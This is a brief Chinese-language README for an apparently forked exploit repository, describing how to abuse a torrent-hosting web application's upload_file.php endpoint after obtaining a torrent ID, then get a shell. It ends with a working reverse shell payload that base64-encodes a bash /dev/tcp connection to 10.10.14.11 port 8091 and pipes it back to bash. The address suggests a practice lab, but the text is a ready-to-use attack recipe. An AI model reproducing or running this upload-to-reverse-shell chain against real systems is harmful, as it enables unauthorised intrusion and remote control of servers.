# exploits
在大佬的项目上进行修改的，运行大佬的代码存在报错，对代码进行了下修复
https://github.com/Anon-Exploiter/exploits

#代码执行逻辑
利用要求 需要有一个账户，账户下面有一个torrents文件。可以获得 tid

url + index.php?mode=directory   查看上传的torrents文件，如果没有上传需要先上传一个才能利用

url + upload_file.php?mode=upload&id= tId    向tId 上传文件

#反弹shell 木马
echo -n '/bin/bash -c "bash -i >& /dev/tcp/10.10.14.11/8091 0>&1"' |base64
echo $base64_code |base64 -d| bash
